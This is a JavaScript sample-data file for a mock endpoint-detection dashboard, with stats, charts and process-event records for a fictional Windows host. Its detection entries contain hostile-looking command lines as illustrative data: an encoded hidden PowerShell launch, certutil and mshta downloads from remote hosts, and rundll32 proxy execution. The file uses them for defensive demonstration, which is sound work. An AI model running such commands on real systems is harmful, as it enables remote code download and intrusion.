/*
 * Sample data for the ReaperWatch console mockup.
 * Shapes mirror the real API responses, so app.js can later `fetch()` these
 * same structures from /api/* with no rendering changes. Values are illustrative
 * (a mix of benign real-world processes and a few planted "detections") on a
 * fictional endpoint/user -- not any real machine.
 */
window.RW = {

  host: { hostname: "LPT-DEV-MORGAN-07", os: "Windows 11 (build 26200)", arch: "x64", online: true },

  stats: [
    { label: "PROCESS EVENTS (24H)", value: "1,842", delta: "+312", dir: "up",   ico: "◎",
      spark: [12,18,15,22,19,28,24,31,27,35,30,42] },
    { label: "OPEN DETECTIONS",      value: "7",     delta: "+3",   dir: "up",   ico: "⚠",
      spark: [1,0,1,2,1,3,2,4,3,5,4,7] },
    { label: "UNSIGNED EXECUTIONS",  value: "23",    delta: "-4",   dir: "down", ico: "✎",
      spark: [8,6,7,5,9,6,4,5,3,4,2,3] },
    { label: "LOLBIN LAUNCHES",      value: "41",    delta: "+11",  dir: "up",   ico: "⌘",
      spark: [3,5,4,6,5,7,6,8,7,9,8,11] },
  ],

  // 7-day stacked area (critical / high / medium-low counts per day)
  volume: {
    days: ["Jul 6","Jul 7","Jul 8","Jul 9","Jul 10","Jul 11","Jul 12"],
    critical: [1, 0, 2, 1, 3, 2, 4],
    high:     [3, 4, 3, 6, 5, 7, 8],
    medlow:   [9, 7, 11, 8, 12, 10, 14],
  },

  breakdown: {
    total: 34,
    items: [
      { name: "Execution",        value: 12, color: "#e5484d" },
      { name: "Defense Evasion",  value: 8,  color: "#f5a524" },
      { name: "Priv. Escalation", value: 6,  color: "#f3d13e" },
      { name: "Persistence",      value: 5,  color: "#4a90e2" },
      { name: "Discovery",        value: 3,  color: "#8b90a0" },
    ],
  },

  detections: [
    { sev:"critical", rule:"Encoded PowerShell command", proc:"powershell.exe", pid:7821,
      mitre:"T1059.001", mitreName:"PowerShell", user:"jmorgan", time:"04:41:52",
      detail:"powershell -nop -w hidden -enc SQBFAFgAKA…", host:"LPT-DEV-MORGAN-07" },
    { sev:"critical", rule:"certutil remote download", proc:"certutil.exe", pid:9912,
      mitre:"T1105", mitreName:"Ingress Tool Transfer", user:"jmorgan", time:"04:39:10",
      detail:"certutil -urlcache -f http://185.220.101.47/x.exe", host:"LPT-DEV-MORGAN-07" },
    { sev:"high", rule:"Office spawned a shell", proc:"cmd.exe", pid:2340,
      mitre:"T1059", mitreName:"Command & Scripting", user:"jmorgan", time:"04:38:44",
      detail:"WINWORD.EXE → cmd.exe /c powershell …", host:"LPT-DEV-MORGAN-07" },
    { sev:"high", rule:"Unsigned binary from Temp", proc:"invoice.exe", pid:1024,
      mitre:"T1204", mitreName:"User Execution", user:"jmorgan", time:"04:37:29",
      detail:"C:\\Users\\jmorgan\\AppData\\Local\\Temp\\invoice.exe (unsigned)", host:"LPT-DEV-MORGAN-07" },
    { sev:"high", rule:"rundll32 proxy execution", proc:"rundll32.exe", pid:6540,
      mitre:"T1218.011", mitreName:"Rundll32", user:"jmorgan", time:"04:33:18",
      detail:"rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication …\"", host:"LPT-DEV-MORGAN-07" },
    { sev:"medium", rule:"mshta script host", proc:"mshta.exe", pid:5561,
      mitre:"T1218.005", mitreName:"Mshta", user:"jmorgan", time:"04:29:03",
      detail:"mshta http://example.test/a.hta", host:"LPT-DEV-MORGAN-07" },
    { sev:"medium", rule:"SYSTEM shell from user process", proc:"cmd.exe", pid:3110,
      mitre:"T1548", mitreName:"Abuse Elevation", user:"SYSTEM", time:"04:22:55",
      detail:"cmd.exe running as NT AUTHORITY\\SYSTEM", host:"LPT-DEV-MORGAN-07" },
  ],

  // raw process_create events for the Hunt view (full enriched shape)
  events: [
    ev(0,"04:44:49","RuntimeBroker.exe","C:\\Windows\\System32\\RuntimeBroker.exe",2944,
       "RuntimeBroker.exe -Embedding","svchost.exe",1952,"jmorgan",true,"Microsoft Windows"),
    ev(2,"04:44:51","smartscreen.exe","C:\\Windows\\System32\\smartscreen.exe",42924,
       "C:\\Windows\\System32\\smartscreen.exe -Embedding","svchost.exe",1952,"jmorgan",true,"Microsoft Windows"),
    ev(3,"04:44:51","consent.exe","C:\\Windows\\System32\\consent.exe",30692,
       "consent.exe 10912 604 000001EC7C172900","svchost.exe",10912,"SYSTEM",true,"Microsoft Windows"),
    ev(6,"04:44:54","powershell.exe","C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",25020,
       "\"powershell.exe\"","explorer.exe",25116,"jmorgan",true,"Microsoft Windows"),
    ev(9,"04:45:08","msedgewebview2.exe","C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\149.0.4022.98\\msedgewebview2.exe",18440,
       "msedgewebview2.exe --type=renderer --webview-exe-name=WhatsApp.Root.exe …","msedgewebview2.exe",18244,"jmorgan",true,"Microsoft Corporation"),
    ev(12,"04:45:10","msedge.exe","C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",40052,
       "\"msedge.exe\" --type=renderer --lang=en-US …","msedge.exe",38808,"jmorgan",true,"Microsoft Corporation"),
    ev(27,"04:41:52","powershell.exe","C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",7821,
       "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0…","cmd.exe",2340,"jmorgan",true,"Microsoft Windows"),
    ev(31,"04:39:10","certutil.exe","C:\\Windows\\System32\\certutil.exe",9912,
       "certutil -urlcache -f http://185.220.101.47/x.exe C:\\Users\\jmorgan\\x.exe","cmd.exe",2340,"jmorgan",true,"Microsoft Windows"),
    ev(44,"04:37:29","invoice.exe","C:\\Users\\jmorgan\\AppData\\Local\\Temp\\invoice.exe",1024,
       "\"C:\\Users\\jmorgan\\AppData\\Local\\Temp\\invoice.exe\"","explorer.exe",25116,"jmorgan",false,null),
  ],

  topSigners: [
    { name:"Microsoft Windows",     value:"1,204", color:"#3fb950" },
    { name:"Microsoft Corporation", value:"389",   color:"#4a90e2" },
    { name:"Google LLC",            value:"77",    color:"#4a90e2" },
    { name:"(unsigned)",            value:"23",    color:"#e5484d" },
    { name:"NVIDIA Corporation",    value:"14",    color:"#8b90a0" },
  ],
};

function ev(seq, time, name, path, pid, cmdline, parentName, parentPid, user, signed, signer) {
  const isSystem = user === "SYSTEM";
  return {
    event_type: "process_create",
    timestamp: "2026-07-12T" + time + ".000Z",
    time, sequence_id: seq,
    process: { pid, name, path, cmdline, sha256: fakehash(name), md5: fakehash(name).slice(0,32),
               signed, signer },
    parent: { pid: parentPid, name: parentName },
    grandparent: { pid: 0, name: "services.exe" },
    user: { name: isSystem ? "SYSTEM" : user, domain: isSystem ? "NT AUTHORITY" : "LPT-DEV-MORGAN-07",
            sid: isSystem ? "S-1-5-18" : "S-1-5-21-1004336348-1177238915-682003330-1001",
            is_admin: isSystem, is_system: isSystem },
    host: { hostname: "LPT-DEV-MORGAN-07", os: "Windows 11 (build 26200)", arch: "x64" },
    flags: { is_lolbin: /powershell|cmd|rundll32|mshta|certutil|wscript/i.test(name),
             unusual_parent: false, is_hollow: false, is_injected: false },
  };
}
function fakehash(s) {
  let h = "", seed = 0; for (const c of s) seed = (seed * 31 + c.charCodeAt(0)) >>> 0;
  for (let i = 0; i < 64; i++) { seed = (seed * 1103515245 + 12345) & 0x7fffffff; h += "0123456789abcdef"[seed & 15]; }
  return h;
}
